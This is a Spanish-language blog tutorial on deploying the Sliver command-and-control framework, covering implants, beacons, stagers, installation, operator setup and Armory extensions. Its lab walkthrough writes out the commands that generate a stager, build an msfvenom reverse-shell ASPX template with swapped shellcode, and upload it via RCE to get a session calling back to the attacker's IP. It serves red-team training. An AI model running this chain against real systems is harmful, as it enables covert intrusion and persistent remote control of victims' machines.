---
layout: single
title: "Command & Control con Sliver"
author_profile: true
published: true
toc: true
toc_sticky: true
comments: true
---

###### Este es un post que se enfocará en el deploy y el uso Introductorio de un _Command And Control Framework_. Seguramente habrá más tecnicismos así que tenlo en cuenta. 

Si hablamos de un _Command And Control_ o _C&C_ en Red Team, nos estamos refiriendo a la comunicación de un cliente (agente/víctima) con un servidor central (Un servidor controlado por el atacante) donde el servidor central se utiliza para enviar instrucciones a los agentes conectados a él.

Si recordamos algunos conceptos básicos como la _Cyberkill Chain_ de Lockheed Martin; la fase de _Command And Control_ es justo después de ganar acceso al sistema. 

![UTMP]({{ "/images/SliverC2/Cyberkillchain.png" | relative_url }}){: .align-center}

Esto tiene varias razones:

* Persistencia: Cuando se accede al sistema explotando algo, __se necesita una manera de establecer una conexión y que esta conexión no se pierda__; muchas técnicas de los `C2` los hacen sigilosos y resistentes a la detección; permitiendo un control a largo plazo.
* Gestión Remota: El `C2` muchas veces __permite la ejecución de comandos, subidas y descargas arbitrarias__ (y más funcionalidades). Sin establecer este canal, la explotación inicial puede tener una funcionalidad limitada a menos que realicemos más acciones en el objetivo.
* Evasión Y Sigilo: __Las comunicaciones C2 imitan tráfico de red legítimo__ como `HTTP` o `DNS` para evitar ser detectadas por la seguridad, un `C2` bien configurado es mucho más difícil de detectar que las conexiones directa y efímeras de una explotación inicial

Existen muchos frameworks C2, el más 'Común' de ellos, es __Metasploit__, pero también existen muchas más alternativas como `Mythic`, `Emptire`, `CobaltStrike` (el más usado por threat actors) y el que veremos, `Sliver` 

# Sliver Framework

![UTMP]({{ "/images/SliverC2/Sliver.png" | relative_url }}){: .align-center}

Sliver, es un _Command And Control framework diseñado para proveer capacidades avanzadas para administrar y controlar sistemas remotos de forma encubierta_ de código abierto disponible en [Github](https://github.com/BishopFox/sliver) diseñada por BishopFox y desarrollado principalmente sobre `golang`, entre sus capacidades, están las comunicaciones utilizando `Wireguard`, `Mutual TLS` `HTTP/S` y `DNS`, y una característica fundamental, es el `Armory` pero ya veremos eso en un momento.

## Componentes

`Sliver` maneja `Implantes`, `Beacons` y `Stagers`.

* Los `Implantes` son ejecutables o binarios usados para establecer la conexión al C2 su tarea es establecer un punto de conexión y control remoto. 
* El `Beaconing` es el proceso de comunicación desde el objetivo al C2 cada cierto tiempo.
* Los `Stagers` son una forma de cargar código al sistema remoto. Es usado para ejecutar una pieza de un código con mayor funcionalidad.

Los implantes (`Implants`), como mencionamos hace poco, son una parte escencial de la comunicación del C2 donde podemos elegir entre varios protocolos distintos; desde ellos, podemos operar en 2 modos distintos:

* `Beacon Mode` que opera en intervalos.
* `Session Mode` permite la ejecución inmediata de comandos entre el operador y el implante.

Desde cualquiera de los 2 modos, podemos establecer una `shell session`; pero a diferencia de estos 2 modos, la `shell session` establece una conexión TCP o UDP para una conexión en tiempo real e interactiva; esto es __Mal OpSec__ pues establecer este tipo de conexiones es __ruidoso__ y por lo tanto, __detectable__ para los sistemas de seguridad de la red, en cambio, el quedarnos en `Session Mode` no es una conexión directa y cruda, es un canal interactivo; que se `encapsula` en algún protocolo para enmascararlo como tráfico normal, lo que resulta en que sea menos detectable.

El `Beacon Mode` es un canal mucho más sigiloso, sólo se comunica al C2 cada cierto tiempo (configurable), Al tener una conexión de este tipo, se creará una cola de ejecución que el `Beacon` leerá cada vez que se haga la comunicación, ejecutando las tareas y devolviendo la información al C2; esta es la principal diferencia entre los modos `Beacon` y `Session` que es una comunicación más interactiva y en tiempo real pero enmascarando el tráfico y su interacción conforme a cómo fue configurado.

Con ello, podemos afirmar, que el `Beacon Mode` es más utilizado para persistencia manteniendo un bajo perfil (es mucho menos ruidoso ver una conexión por cualquier protocolo cada un minuto comparándola con otros con conexiones TCP en tiempo real) mientras que el `Session Mode` lo utilizamos para post-explotación activa que requiere mayor interacción.

Como nota general, el propósito de los `Stagers` es hacer una tarea pequeña para preparar una más grande, en MalDev, importa mucho el tamaño de los archivos resultantes, llama más la atención un archivo de varios Megabytes comparado a un archivo de unos cuantos Kilobytes, el stager generalmente prepara las bases para el verdader payload, por ejemplo, el de `metasploit` el `stager` prepara la ejecución en memoria y luego hace el request al servidor de `Metasploit` (el lado del atacante) solicitando el código malicioso que se cargará en memoria, lo que puede ser, la reverse shell con mayor funcionalidad como `meterpreter`.

## Instalación

Para instalarlo, podemos utilizar `apt`

```bash
sudo apt install sliver
```

Descargando el ejecutable 

```bash
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-server_linux
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-client_linux
chmod +x ./sliver-server_linux
chmod +x ./sliver-client_linux
```

O Descargando el realease desde el [repositorio de Github](https://github.com/BishopFox/sliver)

![UTMP]({{ "/images/SliverC2/SliverGithub.png" | relative_url }}){: .align-center}

Lo que más recomiendo es, o que bien, descarguen tanto el `Client` como el `Server` desde github o con `apt` (que les descargará ambos componentes sin mayor problema) por una sencilla razón: Suele pasar, que mientras estás interactuando en tu sesión únicamente con el server, te equivocaste y precionaste `CTRL + C`, te sacará de la sesión completamente y deteniendo el programa, que resulta en perder todo el progreso, por ello, ejecutas el `server`, habilitas el `multiplayer` (como veremos a continuación) y nos conectamos utilizando el `Client`.

Para iniciarlo, basta con ejecutar `sliver-server` o habilitar la ejecución y lanzar el ejecutable si es que lo descargaste `chmod +x sliver-server && ./sliver-server`:

```bash
❯ sliver-server 
[*] Loaded 22 aliases from disk
[*] Loaded 151 extension(s) from disk

 	 ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
	▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
	░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
	 ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
	▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
	▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
	░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
		 ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain infect
[*] Server v1.5.43 - parrot
[*] Welcome to the sliver shell, please type 'help' for options

[server] sliver >  
```
Para ver toda la lista de comandos, utilizamos `help`:

```js
[server] sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener
```

Si tienes dudas con algún comando, puedes utilizar `help` y el comando para obtener información sobre su uso:

```js
[server] sliver > help dns

Start a DNS listener

Usage:
======
  dns [flags]

Flags:
======
  -D, --disable-otp           disable otp authentication
  -d, --domains     string    parent domain(s) to use for DNS c2
  -h, --help                  display help
  -L, --lhost       string    interface to bind server to
  -l, --lport       int       udp listen port (default: 53)
  -c, --no-canaries           disable dns canary detection
  -p, --persistent            make persistent across restarts
  -t, --timeout     int       command timeout in seconds (default: 60)
```

Utilizando este método, haremos algo tan secillo como crear un operador:

```js
[server] sliver > help new-operator 

Create a new operator config file

Usage:
======
  new-operator [flags]

Flags:
======
  -h, --help            display help
  -l, --lhost string    listen host
  -p, --lport int       listen port (default: 31337)
  -n, --name  string    operator name
  -s, --save  string    directory/file to the binary to

[server] sliver > new-operator -l 127.0.0.1 -n SomeName

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /home/SomeName/SomeName.127.0.0.1.cfg 

```

_Es importante que notes que `Sliver` opera por defecto en el puerto 31337, y puedes cambiarlo o habilitarlo en las reglas del firewall si es que no lo has hecho._

Y después de ello, habilitamos el `multiplayer`

```js
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
[*] student has joined the game
```

Y desde otra terminal o sesión, utilizar `Sliver-client` importando el `cfg`

```js
sliver-client import SomeName.127.0.0.1.cfg
2025/09/10 07:31:11 Saved new client config to: /home/SomeName/.sliver-client/configs/SomeName.127.0.0.1.cfg 
```

Y entrar con...

```js
❯ sliver-client
? Select a server: SomeName@127.0.0.1 (c8f394aa98ef7943)
Connecting to 127.0.0.1:31337 ...
[*] Loaded 22 aliases from disk
[*] Loaded 151 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain evolve
[*] Server v1.5.43 - parrot
[*] Welcome to the sliver shell, please type 'help' for options

sliver >  
```

Ahora, ya con nuestro deploy, podemos ahora instalar `Armory`.

`Armory` son una extensión de las funcionalidades que ya ofrece `Sliver` como binarios .NET, Son súmamente útiles, ya que permiten utilzar herramientas muy comunes en post-explotación con sólo un comando, en vez de hacer toda una cadena de ejecución o transformar el binario en shellcode (funcionalidades muy interesantes por cierto)

Para instalarlos, nos vamos del lado del `Server` y primero debemos utilizar el comando `armory` para hacer el _fetch_ de los recursos.

```js
sliver > armory

[*] Fetching 1 armory index(es) ... done!
[*] Fetching package information ... done!
 Packages

 Command Name                    Version   Type        Help                                                                                                                                      URL          
=============================== ========= =========== ========================================================================================================================================= ==============
================================================
 bof-roast                       v0.0.2    Extension   Beacon Object File repo for roasting Active Directory                                                                                     https://githu
b.com/sliverarmory/BofRoast
 bof-servicemove                 v0.0.1    Extension   Lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking                                      https://githu
b.com/netero1010/ServiceMove-BOF
 c2tc-addmachineaccount
```

y luego `armory install all`.

```js
[server] sliver > armory install all

? Install 22 aliases and 151 extensions? Yes
[*] Installing alias 'sqlrecon' (v3.8.0) ... done!
[*] Installing alias 'Seatbelt' (v0.0.6) ... done!
[*] Installing alias 'Certify' (v0.0.4) ... done!
[*] Installing alias 'SharpSCCM' (v2.0.12) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.4) ... done!
[*] Installing alias 'SharpUp' (v0.0.2) ... done!
[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
[*] Installing alias 'SharpChrome' (v0.0.4) ... done!
<SNIP!>
```

## Operaciones Básicas

Ahora, ya comprendiendo un poco los compomnentes; podemos pasar a los perfiles y luego a la generación del implante.

Primero, para crear los implantes, `Sliver` utiliza el comando `generate` seguido del tipo de implante que necesitemos:

```js
sliver > generate beacon --help
Generate a beacon binary

Usage:
======
  beacon [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -D, --days               int       beacon interval days (default: 0)
  -d, --debug                        enable debug features
  -O, --debug-file         string    path to debug output
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
```

Los `profiles` funcionan como un _blueprint_ de configurción, se utiliza cuando vamos a utilizar distintos payloads pero con  la misma configuración, veamos un ejemplo:

Estamos en un laboratorio vulnerable con IIS, donde pudimos explotar un RCE, que en vez de subir/ejecutar una reverse shell en crudo, podemos subir un stager para empezar a utilizar nuestro C2. Para esta tarea, primero creamos el profile utilizando nuestra dirección IP y nuestro puerto a la escucha.

```js
sliver > profiles new --http 192.168.122.1:8080 --format shellcode Mandarina

[*] Saved new implant profile Mandarina
```

Luego, configuramos el `stage-listener` para que esté atento a la conexión que genere nuestro `stager`. _El puerto utilizado debe ser distinto al del profile, el stage listener lo estamos configurando para recibir la conexión inicial del stager que con el profile, le estamos indicando el payload en formato shellcode que genere la conexión a la dirección 192.168.122.1 en el puerto 8080._

```js
sliver > stage-listener --url tcp://192.168.122.1:1110 --profile Mandarina

[*] No builds found for profile Mandarina, generating a new one
[*] Sliver name for profile Mandarina: HIGH_RISER
[*] Job 1 (tcp) started
```

Ahora, debemos iniciar el servidor `HTTP` para comunicarnos con el implante.

```js
sliver > http -L 192.168.122.1 -l 8080

[*] Starting HTTP :8080 listener ...
[*] Successfully started job #3
```

Y creamos el stager en el formato que necesitemos (el puerto debe ser el mismo que estamos configurando en el `stage-listener` para realizar la conexión inicial)

```js
sliver > generate stager --lhost 192.168.122.1 --lport 1110 --format csharp --save stager.shellcode
[*] Sliver implant stager saved to: /home/SomeName/stager.shellcode
```

Ahora, esto generará el shellcode necesario para comunicarse con el C2, pero aún necesitamos una vía para ejecutarlo, para la tarea podemos utilizar msfvenom para generar un template y luego cambiar el shellcode:

```js
❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.122.1 LPORT=1110 -f aspx > tasks.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2844 bytes
```

Si examinamos el archivo, notaremos que tiene una sección con el shellcode, pero ese shellcode lo tenemos que reemplazar por el que esté en `stager.shellcode`.  _Sólo tienes que copiar y pegar desde el new byte y el shellcode, el byte random-name es generado por msfvenom pero es utilizado dentro de la lógica del aspx, no lo cambies._

Y al finalizar de copiar y pegar el shellcode, sólo debemos subir nuestro stager (si alcanzamos RCE, has el proceso clásico de iniciar un servidor HTTP en agún puerto que no utilices, hacer el `wget` al archivo, acceder desde el navegador) y recibir la conexión del implante:

```js
[*] Session e1b6e6f4 WHISPERING_PLANE - 192.168.122.2:49692 (Personal01) - windows/amd64 - Wed, 10 Sep 2025 23:36:49 CST

sliver > sessions 

 ID         Name               Transport   Remote Address         Hostname   Username   Operating System   Locale   Last Message                            Health  
========== ================== =========== ====================== ========== ========== ================== ======== ======================================= =========
 e1b6e6f4   WHISPERING_PLANE   http(s)     192.168.122.2:49692   Personal01      <err>      windows/amd64      en-US    Wed Sep 10 23:36:57 CST 2025 (1s ago)   [ALIVE] 

sliver >  
```

Y para interactuar, basta con utilizar `use` y los primeros caracteres del ID para luego completarlo con el `TAB` (autocompletado)

```js
sliver > use e1b6e6f4-4bff-422f-be7b-2244948f25e9

[*] Active session WHISPERING_PLANE (e1b6e6f4-4bff-422f-be7b-2244948f25e9)

sliver (WHISPERING_PLANE) >  
```


###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.